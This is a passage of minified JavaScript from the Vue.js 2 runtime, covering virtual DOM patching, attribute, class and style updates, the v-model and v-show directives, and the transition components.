_t(n)?n.slice(6,n.length):""},Nt=function(n){return null==n||!1===n};function Lt(n){for(var e=n.data,t=n,r=n;i(r.componentInstance);)(r=r.componentInstance._vnode)&&r.data&&(e=qt(r.data,e));for(;i(t=t.parent);)t&&t.data&&(e=qt(e,t.data));return function(n,e){if(i(n)||i(e))return $t(n,Wt(e));return""}(e.staticClass,e.class)}function qt(n,e){return{staticClass:$t(n.staticClass,e.staticClass),class:i(n.class)?[n.class,e.class]:e.class}}function $t(n,e){return n?e?n+" "+e:n:e||""}function Wt(n){return Array.isArray(n)?function(n){for(var e,t="",r=0,a=n.length;r<a;r++)i(e=Wt(n[r]))&&""!==e&&(t&&(t+=" "),t+=e);return t}(n):c(n)?function(n){var e="";for(var t in n)n[t]&&(e&&(e+=" "),e+=t);return e}(n):"string"==typeof n?n:""}var Ht={svg:"http://www.w3.org/2000/svg",math:"http://www.w3.org/1998/Math/MathML"},Ut=g("html,body,base,head,link,meta,style,title,address,article,aside,footer,header,h1,h2,h3,h4,h5,h6,hgroup,nav,section,div,dd,dl,dt,figcaption,figure,picture,hr,img,li,main,ol,p,pre,ul,a,b,abbr,bdi,bdo,br,cite,code,data,dfn,em,i,kbd,mark,q,rp,rt,rtc,ruby,s,samp,small,span,strong,sub,sup,time,u,var,wbr,area,audio,map,track,video,embed,object,param,source,canvas,script,noscript,del,ins,caption,col,colgroup,table,thead,tbody,td,th,tr,button,datalist,fieldset,form,input,label,legend,meter,optgroup,option,output,progress,select,textarea,details,dialog,menu,menuitem,summary,content,element,shadow,template,blockquote,iframe,tfoot"),Vt=g("svg,animate,circle,clippath,cursor,defs,desc,ellipse,filter,font-face,foreignObject,g,glyph,image,line,marker,mask,missing-glyph,path,pattern,polygon,polyline,rect,switch,symbol,text,textpath,tspan,use,view",!0),Gt=function(n){return Ut(n)||Vt(n)};var Xt=Object.create(null);var Kt=g("text,number,password,search,email,tel,url");var Yt=Object.freeze({createElement:function(n,e){var t=document.createElement(n);return"select"!==n||e.data&&e.data.attrs&&void 0!==e.data.attrs.multiple&&t.setAttribute("multiple","multiple"),t},createElementNS:function(n,e){return document.createElementNS(Ht[n],e)},createTextNode:function(n){return document.createTextNode(n)},createComment:function(n){return document.createComment(n)},insertBefore:function(n,e,t){n.insertBefore(e,t)},removeChild:function(n,e){n.removeChild(e)},appendChild:function(n,e){n.appendChild(e)},parentNode:function(n){return n.parentNode},nextSibling:function(n){return n.nextSibling},tagName:function(n){return n.tagName},setTextContent:function(n,e){n.textContent=e},setStyleScope:function(n,e){n.setAttribute(e,"")}}),Qt={create:function(n,e){Zt(e)},update:function(n,e){n.data.ref!==e.data.ref&&(Zt(n,!0),Zt(e))},destroy:function(n){Zt(n,!0)}};function Zt(n,e){var t=n.data.ref;if(i(t)){var r=n.context,a=n.componentInstance||n.elm,o=r.$refs;e?Array.isArray(o[t])?y(o[t],a):o[t]===a&&(o[t]=void 0):n.data.refInFor?Array.isArray(o[t])?o[t].indexOf(a)<0&&o[t].push(a):o[t]=[a]:o[t]=a}}var nr=new vn("",{},[]),er=["create","activate","update","remove","destroy"];function tr(n,e){return n.key===e.key&&(n.tag===e.tag&&n.isComment===e.isComment&&i(n.data)===i(e.data)&&function(n,e){if("input"!==n.tag)return!0;var t,r=i(t=n.data)&&i(t=t.attrs)&&t.type,a=i(t=e.data)&&i(t=t.attrs)&&t.type;return r===a||Kt(r)&&Kt(a)}(n,e)||l(n.isAsyncPlaceholder)&&n.asyncFactory===e.asyncFactory&&o(e.asyncFactory.error))}function rr(n,e,t){var r,a,o={};for(r=e;r<=t;++r)i(a=n[r].key)&&(o[a]=r);return o}var ar={create:or,update:or,destroy:function(n){or(n,nr)}};function or(n,e){(n.data.directives||e.data.directives)&&function(n,e){var t,r,a,o=n===nr,i=e===nr,l=lr(n.data.directives,n.context),s=lr(e.data.directives,e.context),c=[],d=[];for(t in s)r=l[t],a=s[t],r?(a.oldValue=r.value,a.oldArg=r.arg,cr(a,"update",e,n),a.def&&a.def.componentUpdated&&d.push(a)):(cr(a,"bind",e,n),a.def&&a.def.inserted&&c.push(a));if(c.length){var u=function(){for(var t=0;t<c.length;t++)cr(c[t],"inserted",e,n)};o?ce(e,"insert",u):u()}d.length&&ce(e,"postpatch",(function(){for(var t=0;t<d.length;t++)cr(d[t],"componentUpdated",e,n)}));if(!o)for(t in l)s[t]||cr(l[t],"unbind",n,n,i)}(n,e)}var ir=Object.create(null);function lr(n,e){var t,r,a=Object.create(null);if(!n)return a;for(t=0;t<n.length;t++)(r=n[t]).modifiers||(r.modifiers=ir),a[sr(r)]=r,r.def=Fn(e.$options,"directives",r.name);return a}function sr(n){return n.rawName||n.name+"."+Object.keys(n.modifiers||{}).join(".")}function cr(n,e,t,r,a){var o=n.def&&n.def[e];if(o)try{o(t.elm,n,t,r,a)}catch(r){Wn(r,t.context,"directive "+n.name+" "+e+" hook")}}var dr=[Qt,ar];function ur(n,e){var t=e.componentOptions;if(!(i(t)&&!1===t.Ctor.options.inheritAttrs||o(n.data.attrs)&&o(e.data.attrs))){var r,a,l=e.elm,s=n.data.attrs||{},c=e.data.attrs||{};for(r in i(c.__ob__)&&(c=e.data.attrs=R({},c)),c)a=c[r],s[r]!==a&&pr(l,r,a);for(r in(K||Q)&&c.value!==s.value&&pr(l,"value",c.value),s)o(c[r])&&(_t(r)?l.removeAttributeNS(Pt,Ft(r)):Ot(r)||l.removeAttribute(r))}}function pr(n,e,t){n.tagName.indexOf("-")>-1?mr(n,e,t):Mt(e)?Nt(t)?n.removeAttribute(e):(t="allowfullscreen"===e&&"EMBED"===n.tagName?"true":e,n.setAttribute(e,t)):Ot(e)?n.setAttribute(e,function(n,e){return Nt(e)||"false"===e?"false":"contenteditable"===n&&Jt(e)?e:"true"}(e,t)):_t(e)?Nt(t)?n.removeAttributeNS(Pt,Ft(e)):n.setAttributeNS(Pt,e,t):mr(n,e,t)}function mr(n,e,t){if(Nt(t))n.removeAttribute(e);else{if(K&&!Y&&"TEXTAREA"===n.tagName&&"placeholder"===e&&""!==t&&!n.__ieph){var r=function(e){e.stopImmediatePropagation(),n.removeEventListener("input",r)};n.addEventListener("input",r),n.__ieph=!0}n.setAttribute(e,t)}}var hr={create:ur,update:ur};function fr(n,e){var t=e.elm,r=e.data,a=n.data;if(!(o(r.staticClass)&&o(r.class)&&(o(a)||o(a.staticClass)&&o(a.class)))){var l=Lt(e),s=t._transitionClasses;i(s)&&(l=$t(l,Wt(s))),l!==t._prevClass&&(t.setAttribute("class",l),t._prevClass=l)}}var vr,gr={create:fr,update:fr};function br(n,e,t){var r=vr;return function a(){var o=e.apply(null,arguments);null!==o&&Er(n,a,t,r)}}var yr=Xn&&!(nn&&Number(nn[1])<=53);function xr(n,e,t,r){if(yr){var a=st,o=e;e=o._wrapper=function(n){if(n.target===n.currentTarget||n.timeStamp>=a||n.timeStamp<=0||n.target.ownerDocument!==document)return o.apply(this,arguments)}}vr.addEventListener(n,e,tn?{capture:t,passive:r}:t)}function Er(n,e,t,r){(r||vr).removeEventListener(n,e._wrapper||e,t)}function wr(n,e){if(!o(n.data.on)||!o(e.data.on)){var t=e.data.on||{},r=n.data.on||{};vr=e.elm,function(n){if(i(n.__r)){var e=K?"change":"input";n[e]=[].concat(n.__r,n[e]||[]),delete n.__r}i(n.__c)&&(n.change=[].concat(n.__c,n.change||[]),delete n.__c)}(t),se(t,r,xr,Er,br,e.context),vr=void 0}}var jr,Ar={create:wr,update:wr};function kr(n,e){if(!o(n.data.domProps)||!o(e.data.domProps)){var t,r,a=e.elm,l=n.data.domProps||{},s=e.data.domProps||{};for(t in i(s.__ob__)&&(s=e.data.domProps=R({},s)),l)t in s||(a[t]="");for(t in s){if(r=s[t],"textContent"===t||"innerHTML"===t){if(e.children&&(e.children.length=0),r===l[t])continue;1===a.childNodes.length&&a.removeChild(a.childNodes[0])}if("value"===t&&"PROGRESS"!==a.tagName){a._value=r;var c=o(r)?"":String(r);Br(a,c)&&(a.value=c)}else if("innerHTML"===t&&Vt(a.tagName)&&o(a.innerHTML)){(jr=jr||document.createElement("div")).innerHTML="<svg>"+r+"</svg>";for(var d=jr.firstChild;a.firstChild;)a.removeChild(a.firstChild);for(;d.firstChild;)a.appendChild(d.firstChild)}else if(r!==l[t])try{a[t]=r}catch(n){}}}}function Br(n,e){return!n.composing&&("OPTION"===n.tagName||function(n,e){var t=!0;try{t=document.activeElement!==n}catch(n){}return t&&n.value!==e}(n,e)||function(n,e){var t=n.value,r=n._vModifiers;if(i(r)){if(r.number)return v(t)!==v(e);if(r.trim)return t.trim()!==e.trim()}return t!==e}(n,e))}var Sr={create:kr,update:kr},Tr=w((function(n){var e={},t=/:(.+)/;return n.split(/;(?![^(]*\))/g).forEach((function(n){if(n){var r=n.split(t);r.length>1&&(e[r[0].trim()]=r[1].trim())}})),e}));function Ir(n){var e=Rr(n.style);return n.staticStyle?R(n.staticStyle,e):e}function Rr(n){return Array.isArray(n)?z(n):"string"==typeof n?Tr(n):n}var zr,Cr=/^--/,Dr=/\s*!important$/,Or=function(n,e,t){if(Cr.test(e))n.style.setProperty(e,t);else if(Dr.test(t))n.style.setProperty(S(e),t.replace(Dr,""),"important");else{var r=Mr(e);if(Array.isArray(t))for(var a=0,o=t.length;a<o;a++)n.style[r]=t[a];else n.style[r]=t}},Jr=["Webkit","Moz","ms"],Mr=w((function(n){if(zr=zr||document.createElement("div").style,"filter"!==(n=A(n))&&n in zr)return n;for(var e=n.charAt(0).toUpperCase()+n.slice(1),t=0;t<Jr.length;t++){var r=Jr[t]+e;if(r in zr)return r}}));function Pr(n,e){var t=e.data,r=n.data;if(!(o(t.staticStyle)&&o(t.style)&&o(r.staticStyle)&&o(r.style))){var a,l,s=e.elm,c=r.staticStyle,d=r.normalizedStyle||r.style||{},u=c||d,p=Rr(e.data.style)||{};e.data.normalizedStyle=i(p.__ob__)?R({},p):p;var m=function(n,e){var t,r={};if(e)for(var a=n;a.componentInstance;)(a=a.componentInstance._vnode)&&a.data&&(t=Ir(a.data))&&R(r,t);(t=Ir(n.data))&&R(r,t);for(var o=n;o=o.parent;)o.data&&(t=Ir(o.data))&&R(r,t);return r}(e,!0);for(l in u)o(m[l])&&Or(s,l,"");for(l in m)(a=m[l])!==u[l]&&Or(s,l,null==a?"":a)}}var _r={create:Pr,update:Pr},Fr=/\s+/;function Nr(n,e){if(e&&(e=e.trim()))if(n.classList)e.indexOf(" ")>-1?e.split(Fr).forEach((function(e){return n.classList.add(e)})):n.classList.add(e);else{var t=" "+(n.getAttribute("class")||"")+" ";t.indexOf(" "+e+" ")<0&&n.setAttribute("class",(t+e).trim())}}function Lr(n,e){if(e&&(e=e.trim()))if(n.classList)e.indexOf(" ")>-1?e.split(Fr).forEach((function(e){return n.classList.remove(e)})):n.classList.remove(e),n.classList.length||n.removeAttribute("class");else{for(var t=" "+(n.getAttribute("class")||"")+" ",r=" "+e+" ";t.indexOf(r)>=0;)t=t.replace(r," ");(t=t.trim())?n.setAttribute("class",t):n.removeAttribute("class")}}function qr(n){if(n){if("object"==typeof n){var e={};return!1!==n.css&&R(e,$r(n.name||"v")),R(e,n),e}return"string"==typeof n?$r(n):void 0}}var $r=w((function(n){return{enterClass:n+"-enter",enterToClass:n+"-enter-to",enterActiveClass:n+"-enter-active",leaveClass:n+"-leave",leaveToClass:n+"-leave-to",leaveActiveClass:n+"-leave-active"}})),Wr=U&&!Y,Hr="transition",Ur="transitionend",Vr="animation",Gr="animationend";Wr&&(void 0===window.ontransitionend&&void 0!==window.onwebkittransitionend&&(Hr="WebkitTransition",Ur="webkitTransitionEnd"),void 0===window.onanimationend&&void 0!==window.onwebkitanimationend&&(Vr="WebkitAnimation",Gr="webkitAnimationEnd"));var Xr=U?window.requestAnimationFrame?window.requestAnimationFrame.bind(window):setTimeout:function(n){return n()};function Kr(n){Xr((function(){Xr(n)}))}function Yr(n,e){var t=n._transitionClasses||(n._transitionClasses=[]);t.indexOf(e)<0&&(t.push(e),Nr(n,e))}function Qr(n,e){n._transitionClasses&&y(n._transitionClasses,e),Lr(n,e)}function Zr(n,e,t){var r=ea(n,e),a=r.type,o=r.timeout,i=r.propCount;if(!a)return t();var l="transition"===a?Ur:Gr,s=0,c=function(){n.removeEventListener(l,d),t()},d=function(e){e.target===n&&++s>=i&&c()};setTimeout((function(){s<i&&c()}),o+1),n.addEventListener(l,d)}var na=/\b(transform|all)(,|$)/;function ea(n,e){var t,r=window.getComputedStyle(n),a=(r[Hr+"Delay"]||"").split(", "),o=(r[Hr+"Duration"]||"").split(", "),i=ta(a,o),l=(r[Vr+"Delay"]||"").split(", "),s=(r[Vr+"Duration"]||"").split(", "),c=ta(l,s),d=0,u=0;return"transition"===e?i>0&&(t="transition",d=i,u=o.length):"animation"===e?c>0&&(t="animation",d=c,u=s.length):u=(t=(d=Math.max(i,c))>0?i>c?"transition":"animation":null)?"transition"===t?o.length:s.length:0,{type:t,timeout:d,propCount:u,hasTransform:"transition"===t&&na.test(r[Hr+"Property"])}}function ta(n,e){for(;n.length<e.length;)n=n.concat(n);return Math.max.apply(null,e.map((function(e,t){return ra(e)+ra(n[t])})))}function ra(n){return 1e3*Number(n.slice(0,-1).replace(",","."))}function aa(n,e){var t=n.elm;i(t._leaveCb)&&(t._leaveCb.cancelled=!0,t._leaveCb());var r=qr(n.data.transition);if(!o(r)&&!i(t._enterCb)&&1===t.nodeType){for(var a=r.css,l=r.type,s=r.enterClass,d=r.enterToClass,u=r.enterActiveClass,p=r.appearClass,m=r.appearToClass,h=r.appearActiveClass,f=r.beforeEnter,g=r.enter,b=r.afterEnter,y=r.enterCancelled,x=r.beforeAppear,E=r.appear,w=r.afterAppear,j=r.appearCancelled,A=r.duration,k=Ye,B=Ye.$vnode;B&&B.parent;)k=B.context,B=B.parent;var S=!k._isMounted||!n.isRootInsert;if(!S||E||""===E){var T=S&&p?p:s,I=S&&h?h:u,R=S&&m?m:d,z=S&&x||f,C=S&&"function"==typeof E?E:g,D=S&&w||b,O=S&&j||y,J=v(c(A)?A.enter:A);0;var M=!1!==a&&!Y,_=la(C),F=t._enterCb=P((function(){M&&(Qr(t,R),Qr(t,I)),F.cancelled?(M&&Qr(t,T),O&&O(t)):D&&D(t),t._enterCb=null}));n.data.show||ce(n,"insert",(function(){var e=t.parentNode,r=e&&e._pending&&e._pending[n.key];r&&r.tag===n.tag&&r.elm._leaveCb&&r.elm._leaveCb(),C&&C(t,F)})),z&&z(t),M&&(Yr(t,T),Yr(t,I),Kr((function(){Qr(t,T),F.cancelled||(Yr(t,R),_||(ia(J)?setTimeout(F,J):Zr(t,l,F)))}))),n.data.show&&(e&&e(),C&&C(t,F)),M||_||F()}}}function oa(n,e){var t=n.elm;i(t._enterCb)&&(t._enterCb.cancelled=!0,t._enterCb());var r=qr(n.data.transition);if(o(r)||1!==t.nodeType)return e();if(!i(t._leaveCb)){var a=r.css,l=r.type,s=r.leaveClass,d=r.leaveToClass,u=r.leaveActiveClass,p=r.beforeLeave,m=r.leave,h=r.afterLeave,f=r.leaveCancelled,g=r.delayLeave,b=r.duration,y=!1!==a&&!Y,x=la(m),E=v(c(b)?b.leave:b);0;var w=t._leaveCb=P((function(){t.parentNode&&t.parentNode._pending&&(t.parentNode._pending[n.key]=null),y&&(Qr(t,d),Qr(t,u)),w.cancelled?(y&&Qr(t,s),f&&f(t)):(e(),h&&h(t)),t._leaveCb=null}));g?g(j):j()}function j(){w.cancelled||(!n.data.show&&t.parentNode&&((t.parentNode._pending||(t.parentNode._pending={}))[n.key]=n),p&&p(t),y&&(Yr(t,s),Yr(t,u),Kr((function(){Qr(t,s),w.cancelled||(Yr(t,d),x||(ia(E)?setTimeout(w,E):Zr(t,l,w)))}))),m&&m(t,w),y||x||w())}}function ia(n){return"number"==typeof n&&!isNaN(n)}function la(n){if(o(n))return!1;var e=n.fns;return i(e)?la(Array.isArray(e)?e[0]:e):(n._length||n.length)>1}function sa(n,e){!0!==e.data.show&&aa(e)}var ca=function(n){var e,t,r={},a=n.modules,c=n.nodeOps;for(e=0;e<er.length;++e)for(r[er[e]]=[],t=0;t<a.length;++t)i(a[t][er[e]])&&r[er[e]].push(a[t][er[e]]);function d(n){var e=c.parentNode(n);i(e)&&c.removeChild(e,n)}function u(n,e,t,a,o,s,d){if(i(n.elm)&&i(s)&&(n=s[d]=xn(n)),n.isRootInsert=!o,!function(n,e,t,a){var o=n.data;if(i(o)){var s=i(n.componentInstance)&&o.keepAlive;if(i(o=o.hook)&&i(o=o.init)&&o(n,!1),i(n.componentInstance))return p(n,e),m(t,n.elm,a),l(s)&&function(n,e,t,a){var o,l=n;for(;l.componentInstance;)if(l=l.componentInstance._vnode,i(o=l.data)&&i(o=o.transition)){for(o=0;o<r.activate.length;++o)r.activate[o](nr,l);e.push(l);break}m(t,n.elm,a)}(n,e,t,a),!0}}(n,e,t,a)){var u=n.data,f=n.children,g=n.tag;i(g)?(n.elm=n.ns?c.createElementNS(n.ns,g):c.createElement(g,n),b(n),h(n,f,e),i(u)&&v(n,e),m(t,n.elm,a)):l(n.isComment)?(n.elm=c.createComment(n.text),m(t,n.elm,a)):(n.elm=c.createTextNode(n.text),m(t,n.elm,a))}}function p(n,e){i(n.data.pendingInsert)&&(e.push.apply(e,n.data.pendingInsert),n.data.pendingInsert=null),n.elm=n.componentInstance.$el,f(n)?(v(n,e),b(n)):(Zt(n),e.push(n))}function m(n,e,t){i(n)&&(i(t)?c.parentNode(t)===n&&c.insertBefore(n,e,t):c.appendChild(n,e))}function h(n,e,t){if(Array.isArray(e)){0;for(var r=0;r<e.length;++r)u(e[r],t,n.elm,null,!0,e,r)}else s(n.text)&&c.appendChild(n.elm,c.createTextNode(String(n.text)))}function f(n){for(;n.componentInstance;)n=n.componentInstance._vnode;return i(n.tag)}function v(n,t){for(var a=0;a<r.create.length;++a)r.create[a](nr,n);i(e=n.data.hook)&&(i(e.create)&&e.create(nr,n),i(e.insert)&&t.push(n))}function b(n){var e;if(i(e=n.fnScopeId))c.setStyleScope(n.elm,e);else for(var t=n;t;)i(e=t.context)&&i(e=e.$options._scopeId)&&c.setStyleScope(n.elm,e),t=t.parent;i(e=Ye)&&e!==n.context&&e!==n.fnContext&&i(e=e.$options._scopeId)&&c.setStyleScope(n.elm,e)}function y(n,e,t,r,a,o){for(;r<=a;++r)u(t[r],o,n,e,!1,t,r)}function x(n){var e,t,a=n.data;if(i(a))for(i(e=a.hook)&&i(e=e.destroy)&&e(n),e=0;e<r.destroy.length;++e)r.destroy[e](n);if(i(e=n.children))for(t=0;t<n.children.length;++t)x(n.children[t])}function E(n,e,t){for(;e<=t;++e){var r=n[e];i(r)&&(i(r.tag)?(w(r),x(r)):d(r.elm))}}function w(n,e){if(i(e)||i(n.data)){var t,a=r.remove.length+1;for(i(e)?e.listeners+=a:e=function(n,e){function t(){0==--t.listeners&&d(n)}return t.listeners=e,t}(n.elm,a),i(t=n.componentInstance)&&i(t=t._vnode)&&i(t.data)&&w(t,e),t=0;t<r.remove.length;++t)r.remove[t](n,e);i(t=n.data.hook)&&i(t=t.remove)?t(n,e):e()}else d(n.elm)}function j(n,e,t,r){for(var a=t;a<r;a++){var o=e[a];if(i(o)&&tr(n,o))return a}}function A(n,e,t,a,s,d){if(n!==e){i(e.elm)&&i(a)&&(e=a[s]=xn(e));var p=e.elm=n.elm;if(l(n.isAsyncPlaceholder))i(e.asyncFactory.resolved)?S(n.elm,e,t):e.isAsyncPlaceholder=!0;else if(l(e.isStatic)&&l(n.isStatic)&&e.key===n.key&&(l(e.isCloned)||l(e.isOnce)))e.componentInstance=n.componentInstance;else{var m,h=e.data;i(h)&&i(m=h.hook)&&i(m=m.prepatch)&&m(n,e);var v=n.children,g=e.children;if(i(h)&&f(e)){for(m=0;m<r.update.length;++m)r.update[m](n,e);i(m=h.hook)&&i(m=m.update)&&m(n,e)}o(e.text)?i(v)&&i(g)?v!==g&&function(n,e,t,r,a){var l,s,d,p=0,m=0,h=e.length-1,f=e[0],v=e[h],g=t.length-1,b=t[0],x=t[g],w=!a;for(0;p<=h&&m<=g;)o(f)?f=e[++p]:o(v)?v=e[--h]:tr(f,b)?(A(f,b,r,t,m),f=e[++p],b=t[++m]):tr(v,x)?(A(v,x,r,t,g),v=e[--h],x=t[--g]):tr(f,x)?(A(f,x,r,t,g),w&&c.insertBefore(n,f.elm,c.nextSibling(v.elm)),f=e[++p],x=t[--g]):tr(v,b)?(A(v,b,r,t,m),w&&c.insertBefore(n,v.elm,f.elm),v=e[--h],b=t[++m]):(o(l)&&(l=rr(e,p,h)),o(s=i(b.key)?l[b.key]:j(b,e,p,h))?u(b,r,n,f.elm,!1,t,m):tr(d=e[s],b)?(A(d,b,r,t,m),e[s]=void 0,w&&c.insertBefore(n,d.elm,f.elm)):u(b,r,n,f.elm,!1,t,m),b=t[++m]);p>h?y(n,o(t[g+1])?null:t[g+1].elm,t,m,g,r):m>g&&E(e,p,h)}(p,v,g,t,d):i(g)?(i(n.text)&&c.setTextContent(p,""),y(p,null,g,0,g.length-1,t)):i(v)?E(v,0,v.length-1):i(n.text)&&c.setTextContent(p,""):n.text!==e.text&&c.setTextContent(p,e.text),i(h)&&i(m=h.hook)&&i(m=m.postpatch)&&m(n,e)}}}function k(n,e,t){if(l(t)&&i(n.parent))n.parent.data.pendingInsert=e;else for(var r=0;r<e.length;++r)e[r].data.hook.insert(e[r])}var B=g("attrs,class,staticClass,staticStyle,key");function S(n,e,t,r){var a,o=e.tag,s=e.data,c=e.children;if(r=r||s&&s.pre,e.elm=n,l(e.isComment)&&i(e.asyncFactory))return e.isAsyncPlaceholder=!0,!0;if(i(s)&&(i(a=s.hook)&&i(a=a.init)&&a(e,!0),i(a=e.componentInstance)))return p(e,t),!0;if(i(o)){if(i(c))if(n.hasChildNodes())if(i(a=s)&&i(a=a.domProps)&&i(a=a.innerHTML)){if(a!==n.innerHTML)return!1}else{for(var d=!0,u=n.firstChild,m=0;m<c.length;m++){if(!u||!S(u,c[m],t,r)){d=!1;break}u=u.nextSibling}if(!d||u)return!1}else h(e,c,t);if(i(s)){var f=!1;for(var g in s)if(!B(g)){f=!0,v(e,t);break}!f&&s.class&&oe(s.class)}}else n.data!==e.text&&(n.data=e.text);return!0}return function(n,e,t,a){if(!o(e)){var s,d=!1,p=[];if(o(n))d=!0,u(e,p);else{var m=i(n.nodeType);if(!m&&tr(n,e))A(n,e,p,null,null,a);else{if(m){if(1===n.nodeType&&n.hasAttribute("data-server-rendered")&&(n.removeAttribute("data-server-rendered"),t=!0),l(t)&&S(n,e,p))return k(e,p,!0),n;s=n,n=new vn(c.tagName(s).toLowerCase(),{},[],void 0,s)}var h=n.elm,v=c.parentNode(h);if(u(e,p,h._leaveCb?null:v,c.nextSibling(h)),i(e.parent))for(var g=e.parent,b=f(e);g;){for(var y=0;y<r.destroy.length;++y)r.destroy[y](g);if(g.elm=e.elm,b){for(var w=0;w<r.create.length;++w)r.create[w](nr,g);var j=g.data.hook.insert;if(j.merged)for(var B=1;B<j.fns.length;B++)j.fns[B]()}else Zt(g);g=g.parent}i(v)?E([n],0,0):i(n.tag)&&x(n)}}return k(e,p,d),e.elm}i(n)&&x(n)}}({nodeOps:Yt,modules:[hr,gr,Ar,Sr,_r,U?{create:sa,activate:sa,remove:function(n,e){!0!==n.data.show?oa(n,e):e()}}:{}].concat(dr)});Y&&document.addEventListener("selectionchange",(function(){var n=document.activeElement;n&&n.vmodel&&ga(n,"input")}));var da={inserted:function(n,e,t,r){"select"===t.tag?(r.elm&&!r.elm._vOptions?ce(t,"postpatch",(function(){da.componentUpdated(n,e,t)})):ua(n,e,t.context),n._vOptions=[].map.call(n.options,ha)):("textarea"===t.tag||Kt(n.type))&&(n._vModifiers=e.modifiers,e.modifiers.lazy||(n.addEventListener("compositionstart",fa),n.addEventListener("compositionend",va),n.addEventListener("change",va),Y&&(n.vmodel=!0)))},componentUpdated:function(n,e,t){if("select"===t.tag){ua(n,e,t.context);var r=n._vOptions,a=n._vOptions=[].map.call(n.options,ha);if(a.some((function(n,e){return!J(n,r[e])})))(n.multiple?e.value.some((function(n){return ma(n,a)})):e.value!==e.oldValue&&ma(e.value,a))&&ga(n,"change")}}};function ua(n,e,t){pa(n,e,t),(K||Q)&&setTimeout((function(){pa(n,e,t)}),0)}function pa(n,e,t){var r=e.value,a=n.multiple;if(!a||Array.isArray(r)){for(var o,i,l=0,s=n.options.length;l<s;l++)if(i=n.options[l],a)o=M(r,ha(i))>-1,i.selected!==o&&(i.selected=o);else if(J(ha(i),r))return void(n.selectedIndex!==l&&(n.selectedIndex=l));a||(n.selectedIndex=-1)}}function ma(n,e){return e.every((function(e){return!J(e,n)}))}function ha(n){return"_value"in n?n._value:n.value}function fa(n){n.target.composing=!0}function va(n){n.target.composing&&(n.target.composing=!1,ga(n.target,"input"))}function ga(n,e){var t=document.createEvent("HTMLEvents");t.initEvent(e,!0,!0),n.dispatchEvent(t)}function ba(n){return!n.componentInstance||n.data&&n.data.transition?n:ba(n.componentInstance._vnode)}var ya={model:da,show:{bind:function(n,e,t){var r=e.value,a=(t=ba(t)).data&&t.data.transition,o=n.__vOriginalDisplay="none"===n.style.display?"":n.style.display;r&&a?(t.data.show=!0,aa(t,(function(){n.style.display=o}))):n.style.display=r?o:"none"},update:function(n,e,t){var r=e.value;!r!=!e.oldValue&&((t=ba(t)).data&&t.data.transition?(t.data.show=!0,r?aa(t,(function(){n.style.display=n.__vOriginalDisplay})):oa(t,(function(){n.style.display="none"}))):n.style.display=r?n.__vOriginalDisplay:"none")},unbind:function(n,e,t,r,a){a||(n.style.display=n.__vOriginalDisplay)}}},xa={name:String,appear:Boolean,css:Boolean,mode:String,type:String,enterClass:String,leaveClass:String,enterToClass:String,leaveToClass:String,enterActiveClass:String,leaveActiveClass:String,appearClass:String,appearActiveClass:String,appearToClass:String,duration:[Number,String,Object]};function Ea(n){var e=n&&n.componentOptions;return e&&e.Ctor.options.abstract?Ea(Ue(e.children)):n}function wa(n){var e={},t=n.$options;for(var r in t.propsData)e[r]=n[r];var a=t._parentListeners;for(var o in a)e[A(o)]=a[o];return e}function ja(n,e){if(/\d-keep-alive$/.test(e.tag))return n("keep-alive",{props:e.componentOptions.propsData})}var Aa=function(n){return n.tag||He(n)},ka=function(n){return"show"===n.name},Ba={name:"transition",props:xa,abstract:!0,render:function(n){var e=this,t=this.$slots.default;if(t&&(t=t.filter(Aa)).length){0;var r=this.mode;0;var a=t[0];if(function(n){for(;n=n.parent;)if(n.data.transition)return!0}(this.$vnode))return a;var o=Ea(a);if(!o)return a;if(this._leaving)return ja(n,a);var i="__transition-"+this._uid+"-";o.key=null==o.key?o.isComment?i+"comment":i+o.tag:s(o.key)?0===String(o.key).indexOf(i)?o.key:i+o.key:o.key;var l=(o.data||(o.data={})).transition=wa(this),c=this._vnode,d=Ea(c);if(o.data.directives&&o.data.directives.some(ka)&&(o.data.show=!0),d&&d.data&&!function(n,e){return e.key===n.key&&e.tag===n.tag}(o,d)&&!He(d)&&(!d.componentInstance||!d.componentInstance._vnode.isComment)){var u=d.data.transition=R({},l);if("out-in"===r)return this._leaving=!0,ce(u,"afterLeave",(function(){e._leaving=!1,e.$forceUpdate()})),ja(n,a);if("in-out"===r){if(He(o))return c;var p,m=function(){p()};ce(l,"afterEnter",m),ce(l,"enterCancelled",m),ce(u,"delayLeave",(function(n){p=n}))}}return a}}},Sa=R({tag:String,moveClass:String},xa);function Ta(n){n.elm._moveCb&&n.elm._moveCb(),n.elm._enterCb&&n.elm._enterCb()}function Ia(n){n.data.newPos=n.elm.getBoundingClientRect()}function Ra(n){var e=n.data.pos,t=n.data.newPos,r=e.left-t.left,a=e.top-t.top;if(r||a){n.data.moved=!0;var o=n.elm.style;o.transform=o.WebkitTransform="translate("+r+"px,"+a+"px)",o.transitionDuration="0s"}}delete Sa.mode;var za={Transition:Ba,TransitionGroup:{props:Sa,beforeMount:function(){var n=this,e=this._update;this._update=function(t,r){var a=Qe(n);n.__patch__(n._vnode,n.kept,!1,!0),n._vnode=n.kept,a(),e.call(n,t,r)}},render:function(n){for(var e=this.tag||this.$vnode.data.tag||"span",t=Object.create(null),r=this.prevChildren=this.children,a=this.$slots.default||[],o=this.children=[],i=wa(this),l=0;l<a.length;l++){var s=a[l];if(s.tag)if(null!=s.key&&0!==String(s.key).indexOf("__vlist"))o.push(s),t[s.key]=s,(s.data||(s.data={})).transition=i;else;}if(r){for(var c=[],d=[],u=0;u<r.length;u++){var p=r[u];p.data.transition=i,p.data.pos=p.elm.getBoundingClientRect(),t[p.key]?c.push(p):d.push(p)}this.kept=n(e,null,c),this.removed=d}return n(e,null,o)},updated:function(){var n=this.prevChildren,e=this.moveClass||(this.name||"v")+"-move";n.length&&this.hasMove(n[0].elm,e)&&(n.forEach(Ta),n.forEach(Ia),n.forEach(Ra),this._reflow=document.body.offsetHeight,n.forEach((function(n){if(n.data.moved){var t=n.elm,r=t.style;Yr(t,e),r.transform=r.WebkitTransform=r.transitionDuration="",t.addEventListener(Ur,t._moveCb=function n(r){r&&r.target!==t||r&&!/transform$/.test(r.propertyName)||(t.removeEventListener(Ur,n),t._moveCb=null,Qr(t,e))})}})))},methods:{hasMove:function(n,e){if(!Wr)return!1;if(this._hasMove)return this._hasMove;var t=n.cloneNode();n._transitionClasses&&n._transitionClasses.forEach((function(n){Lr(t,n)})),Nr(t,e),t.style.display="none",this.$el.appendChild(t);var r=ea(t);return 